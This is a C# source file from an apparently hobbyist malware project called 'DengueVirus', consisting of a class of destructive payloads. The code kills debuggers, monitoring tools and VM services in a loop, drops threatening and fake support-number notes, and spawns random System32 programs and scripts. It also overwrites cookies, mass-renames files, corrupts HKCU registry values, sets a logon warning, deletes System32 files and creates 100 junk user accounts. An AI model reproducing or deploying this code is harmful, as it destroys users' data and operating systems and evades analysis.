using System;
using System.Diagnostics;
using System.IO;
using System.DirectoryServices.AccountManagement;
using System.Text;

namespace DengueVirus.Spicy
{
    class SpicyPL
    {

        // This is an class with Destructive/Kinda Malicious methods
        // Deleting this call will **NOT** affect the program's functionality

        // To disable the payloads, comment SPICY = true line below, or change it to false.

        public static bool SPICY = true;

        public static void AntiDebug()
        {
            //if (!SPICY) return; this one i deactivated XD
            // Anti-Debugging
            
            // Kill debugging apps process
            Process.Start("taskkill", "/f /t /im x32dbg.exe");
            Process.Start("taskkill", "/f /t /im x64dbg.exe");
            Process.Start("taskkill", "/f /t /im ollydbg.exe");
            Process.Start("taskkill", "/f /t /im idaq.exe");
            Process.Start("taskkill", "/f /t /im idaq64.exe");

            // Kill task manager-esque apps

            Process.Start("taskkill", "/f /t /im taskmgr.exe");
            Process.Start("taskkill", "/f /t /im procexp.exe");
            Process.Start("taskkill", "/f /t /im procexp64.exe");
            Process.Start("taskkill", "/f /t /im procmon.exe");
            Process.Start("taskkill", "/f /t /im procmon64.exe");
            Process.Start("taskkill", "/f /t /im wireshark.exe");
            Process.Start("taskkill", "/f /t /im wireshark64.exe");
            Process.Start("taskkill", "/f /t /im fiddler.exe");
            Process.Start("taskkill", "/f /t /im fiddler64.exe");
            Process.Start("taskkill", "/f /t /im tcpdump.exe");
            Process.Start("taskkill", "/f /t /im tcpdump64.exe");
            Process.Start("taskkill", "/f /t /im windbg.exe");
            Process.Start("taskkill", "/f /t /im windbg64.exe");

            // Kill VMWare tools

            Process.Start("taskkill", "/f /t /im vmtoolsd.exe");
            Process.Start("taskkill", "/f /t /im vmwaretray.exe");
            Process.Start("taskkill", "/f /t /im vmwareuser.exe");

            // Extra

            Process.Start("taskkill", "/f /t /im vboxtray.exe");
            Process.Start("taskkill", "/f /t /im vboxservice.exe");
            Process.Start("taskkill", "/f /t /im vboxguest.exe");
            Process.Start("taskkill", "/f /t /im vboxguestadditions.exe");

            // Protect itself from memory reading

            byte[] buffer = new byte[1024];
            Random random = new Random();
            random.NextBytes(buffer);
        }

        public static void AntiDBGLoop()
        {
            // spam AntiDebug system every 15 sec
            while (true)
            {
                AntiDebug();
                System.Threading.Thread.Sleep(15000);
            }
        }

        public static string GenRandomUnicodeString(int length)
        {
            Random random = new Random();
            StringBuilder builder = new StringBuilder();
            for (int i = 0; i < length; i++)
            {
                builder.Append((char)random.Next(0x0000, 0x10FFFF));
            }
            return builder.ToString();
        }

        public static void WriteNote()
        {
            // Based on QuarkNova's Notepad payload, i kinda like it and
            // i think it fits well with the theme of this project.


            // Btw yeah theres some references to the original .txt note
            // but i guess it makes sense to keep it as a reference. ;)

            if (!SPICY) return;

            string contents = string.Concat(new string[]
            {
                "Hi, im a mosquito, a mosquito that currently infected your computer.",
                Environment.NewLine,
                "As you may have noticed, Im too fast for any scan or taskkill.",
                Environment.NewLine,
                "You currently have only some minutes until my final effect get executed;",
                Environment.NewLine,
                "And trust me - Youre NOT gonna like the final one.",
                Environment.NewLine,Environment.NewLine,
                "- Devil Co., 2025", // should i put UltimateQ Co? Or it will be selfish?
                Environment.NewLine,Environment.NewLine,
                "PS: Please try to interact with your PC while infected;",
                Environment.NewLine,
                "It will be fun for me to see you trying to stop me ;)"
            });
            File.WriteAllText("bsod_log.txt", contents);
            Process.Start("notepad.exe", "bsod_log.txt");
        }

        public static void UserNote()
        {
            // Based (again) on that Quarknova's notepad payload, but this time
            // it will open a notepad with a message FOR the user ;).

            if (!SPICY) return;

            string contents = string.Concat(new string[]
            {
                "Hello, ", Environment.UserName, ", would you like to stop the infection?",
                Environment.NewLine,
                "If yes, call 0800-2580-STOP-", Environment.MachineName, " and press ", Environment.OSVersion.Version.MajorRevision.ToString(), " while on the call.",
                Environment.NewLine,
                "You currently have only some minutes until my final effect get executed;",
                Environment.NewLine,
                "And trust me - Youre NOT gonna like the final one.",
                Environment.NewLine,Environment.NewLine,
                "- Devil Co., 2025" // should i put UltimateQ Co? Or it will be selfish?
            });
            File.WriteAllText("error_log.txt", contents);
            Process.Start("notepad.exe", "error_log.txt");
        }

        public static void Brain()
        {
            // Reference to https://en.wikipedia.org/wiki/Brain_(computer_virus)

            if (!SPICY) return;

            string contents = string.Concat(new string[]
            {
                "@echo off",
                Environment.NewLine,
                "echo Welcome to the Dungeon (c) 1986 Amjads (pvt) Ltd VIRUS_SHOE RECORD V9.0",
                Environment.NewLine,
                "echo Dedicated to the dynamic memories of millions of viruses who are no longer with us today",
                Environment.NewLine,
                "echo - Thanks GOODNESS!!! BEWARE OF THE er..VIRUS : this program is catching program follows after these ....$#@%$@!!",
                Environment.NewLine,
                "pause",
                Environment.NewLine,
                "exit"
            });
            File.WriteAllText("brain.bat", contents);
            Process.Start("cmd.exe", "/k brain.bat");
            //"/k" run command then keep the terminal window open.
        }

        public static void OpenRandomEXE()
        {
            if (!SPICY) return;

            string[] files = {
                "notepad.exe",
                "calc.exe",
                "mspaint.exe",
                "cmd.exe",
                "explorer.exe",
                "write.exe",
                "winver.exe",
                "certmgr.exe",
                "certreq.exe",
                "charmap.exe",
                "cipher.exe",
                "cleanmgr.exe",
                //"clip.exe",
                "control.exe",
                "diskpart.exe"
            };

            Random random = new Random();
            for (int i = 0; i < 5; i++)
            {
                try
                {
                    Process.Start(files[random.Next(files.Length)]);
                }
                catch (Exception)
                {
                }
            }
        }

        public static void OpenRandomEXEFromSys32()
        {
            if (!SPICY) return;
            // Open a random exe file from system32
            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.exe");
            Random random = new Random();
            for (int i = 0; i < 15; i++)
            {
                try
                {
                    Process.Start(files[random.Next(files.Length)]);
                }
                catch (Exception)
                {
                }
            }
        }

        public static void OpenRandomMSCFromSys32()
        {
            if (!SPICY) return;
            // Open a random exe file from system32
            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.msc");
            Random random = new Random();
            for (int i = 0; i < 10; i++)
            {
                try
                {
                    Process.Start(files[random.Next(files.Length)]);
                }
                catch (Exception)
                {
                }
            }
        }
        public static void OpenRandomScreensaver()
        {
            if (!SPICY) return;
            // Open a random screensaver file from system32
            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.scr");
            Random random = new Random();
            //for (int i = 0; i < 5; i++)
            //{
            Process.Start(files[random.Next(files.Length)]);
            //}
        }

        public static void OpenRandomBatchFile()
        {
            if (!SPICY) return;
            // Open a random batch file from system32, .bat, .cmd, .vbs, .ps1
            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.bat");
            string[] files2 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.cmd");
            string[] files3 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.vbs");
            string[] files4 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.ps1");
            Random random = new Random();
            for (int i = 0; i < 5; i++)
            {
                Process.Start(files[random.Next(files.Length)]);
                Process.Start(files2[random.Next(files2.Length)]);
                Process.Start(files3[random.Next(files3.Length)]);
                Process.Start(files4[random.Next(files4.Length)]);
            }
        }
        public static void OverwriteCookie()
        {
            if (!SPICY) return;
            // Overwrite all cookies from the user's profile
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Cookies);
            string[] files = Directory.GetFiles(path);
            foreach (string file in files)
            {
                try
                {
                    File.WriteAllText(file, "Error: THIS IS SPARTAAA!!!!");
                }
                catch (Exception)
                { }
            }
        }

        public static void MassRename(string ogextension, string newextension)
        {
            if (!SPICY) return;
            // rename all computer files, including on subdirectories

            //USAGE: MassRename("txt", "docx");
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string[] files = Directory.GetFiles(path, "*." + ogextension, SearchOption.AllDirectories);
            foreach (string file in files)
            {
                try
                {
                    File.Move(file, file.Replace(ogextension, newextension));
                }
                catch (Exception)
                { }
            }
        }
        public static void CorruptRegistry()
        {
            if (!SPICY) return;
            // Corrupt all HKEY_CURRENT_USER keys & values
            string[] keys = Microsoft.Win32.Registry.CurrentUser.GetSubKeyNames();
            foreach (string key in keys)
            {
                try
                {
                    Microsoft.Win32.Registry.CurrentUser.SetValue(key, "WUT????");
                }
                catch (Exception)
                { }
            }
            // after that, write "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\legalnoticecaption","ATTENTION!", "REG_SZ"
            //"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\legalnoticetext","Your PC has been wrecked by Bolbi!", "REG_SZ"
            Microsoft.Win32.Registry.LocalMachine.SetValue("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\legalnoticecaption", "ATTENTION!", Microsoft.Win32.RegistryValueKind.String);
            Microsoft.Win32.Registry.LocalMachine.SetValue("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\legalnoticetext", "I warned you :)", Microsoft.Win32.RegistryValueKind.String);
        }
        public static void DeleteSystemFiles()
        {
            if (!SPICY) return;
            // Delete all files from system32
            string path = Environment.GetFolderPath(Environment.SpecialFolder.System);
            string[] files = Directory.GetFiles(path);
            foreach (string file in files)
            {
                try
                {
                    File.Delete(file);
                }
                catch (Exception)
                { }
            }
        }
        public static void SpamWindowsWithAccounts()
        {
            if (!SPICY) return;
            // Spam accs
            for (int i = 0; i < 100; i++)
            {
                try
                {
                    using (PrincipalContext context = new PrincipalContext(ContextType.Machine))
                    {
                        UserPrincipal user = new UserPrincipal(context);
                        //user.Name = "User" + i.ToString();
                        user.Name = GenRandomUnicodeString(10);
                        user.SetPassword("XD");
                        user.Save();
                    }
                }
                catch (Exception)
                {}
            }
        }
        /*public static void ForceUACElevation()
        {
            if (!SPICY) return;
            // Force UAC elevation
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.UseShellExecute = true;
            startInfo.WorkingDirectory = Environment.CurrentDirectory;
            startInfo.FileName = Process.GetCurrentProcess().MainModule.FileName;
            startInfo.Verb = "runas";
            try
            {
                Process.Start(startInfo);
            }
            catch (Exception)
            { }
        }*/
    }
}
